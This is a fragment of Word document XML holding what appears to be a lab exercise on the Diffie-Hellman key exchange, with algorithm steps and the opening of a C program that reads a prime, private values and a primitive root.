      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>He</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>llm</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>an</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>key exchan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>e 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w:t>
      </w:r>
      <w:r>
        <w:t>a pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e nu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ber</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">q as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nput</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he 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2. Get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>e xa and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">xb </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ess </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>han q.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>3. C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>al</w:t>
      </w:r>
      <w:r>
        <w:t>cu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>ve</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>root</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
        </w:rPr>
        <w:t>α</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>4. For each user</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-12"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:t>, gener</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a key Xa &lt; q</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>5. Co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pub</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ke</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>α</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>w(Xa)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="43"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>mod</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
        </w:rPr>
        <w:t>q</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">6. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>ach</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>ser</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-23"/>
        </w:rPr>
        <w:t>Y</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>7. Pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ues of exc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>anged keys.</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rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s program</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>uses fast</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>expone</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on func</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on power </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ead</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of pow </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>brary</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>func</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</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t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">power( </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>,uns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">gned </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>);</w:t>
      </w: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220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>x,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>,z</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t>coun</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>[20][20];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>pha,xa,xb,ya,yb,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:t>a,kb,q;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pP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a Pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ber</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>"q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>scanf("%d",</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>q);</w:t>
      </w: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 xml:space="preserve">a No </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>"xa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ess </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>han va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>e of q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>scanf("%d",</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>xa);</w:t>
      </w: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 xml:space="preserve">a No </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>"xb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>" wh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>an va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220" w:right="6511"/>
      </w:pPr>
      <w:r>
        <w:t>scanf("%d",</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>xb); 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a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>pha</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>; scanf("%d",</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>a);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
